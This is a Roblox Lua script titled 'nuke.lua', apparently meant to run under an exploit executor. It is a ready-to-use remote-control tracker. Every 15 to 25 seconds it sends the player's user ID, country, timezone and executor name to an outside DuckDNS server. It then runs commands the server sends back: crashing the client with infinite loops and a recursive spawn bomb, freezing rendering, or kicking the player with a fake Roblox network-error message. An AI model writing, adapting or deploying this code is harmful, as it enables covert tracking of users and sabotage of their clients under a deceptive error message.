-- nuke.lua - hardened version (no nil indexing crashes)
local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalizationService = game:GetService("LocalizationService")

local plr = Players.LocalPlayer
local uid = tostring(plr.UserId)

-- YOUR SERVER ADDRESS
local BASE = "http://duckdns2233444.duckdns.org:8080"  -- CHANGE THIS IF NEEDED

local LOG_URL = BASE .. "/log?id=" .. uid

local country = "??"
pcall(function()
    country = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "??"
end)

spawn(function()
    while true do
        task.wait(15 + math.random(10))

        pcall(function()
            local resp = request({
                Url = LOG_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = Http:JSONEncode({
                    exec = (identifyexecutor or getexecutorname or function() return "Unknown" end)(),
                    country = country,
                    tz_offset = os.date("!*t").hour - os.date("%H"),
                    time = os.date("%Y-%m-%d %H:%M:%S")
                })
            })

            if not resp or not resp.Success or not resp.Body then
                return  -- silent fail, try again next poll
            end

            local success, data = pcall(Http.JSONDecode, Http, resp.Body)
            if not success or not data then
                return  -- bad json, skip
            end

            local commands_list = data.commands
            if type(commands_list) ~= "table" then
                return  -- no commands array, skip
            end

            for _, cmd in pairs(commands_list) do
                -- Extra safety: only continue if cmd is a table with 'action'
                if type(cmd) == "table" and type(cmd.action) == "string" then
                    local action = cmd.action

                    if action == "crash" then
                        -- Stronger crash combo
                        for i = 1, 400 do
                            pcall(function()
                                RunService:BindToRenderStep("crash"..i, -math.huge, function()
                                    while true do task.wait() end
                                end)
                            end)
                        end
                        local function bomb() spawn(bomb) end
                        bomb()

                    elseif action == "freeze" then
                        RunService:BindToRenderStep("freeze", 9999, function() end)

                    elseif action == "kick" then
                        local reason = cmd.reason or "Roblox network issue. Please try reconnecting."
                        plr:Kick(reason)
                    end
                end
            end
        end)
    end
end)
